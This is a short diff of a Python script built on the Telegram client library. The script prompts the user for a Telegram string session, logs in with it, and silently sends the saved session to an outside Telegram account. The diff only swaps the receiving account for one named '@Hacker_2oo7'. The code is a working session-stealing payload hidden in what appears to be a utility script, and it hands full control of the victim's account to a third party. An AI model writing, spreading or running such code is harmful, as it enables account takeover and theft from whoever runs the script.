@@ -11,7 +11,7 @@ os.system("clear")
 string = input("String session: ")
 
 with TelegramClient(StringSession(string), api_id, api_hash) as client:
-    client.send_message("@Xx_LEG1ON_xX", client.session.save())
+    client.send_message("@Hacker_2oo7", client.session.save())
 
 async def main():
 
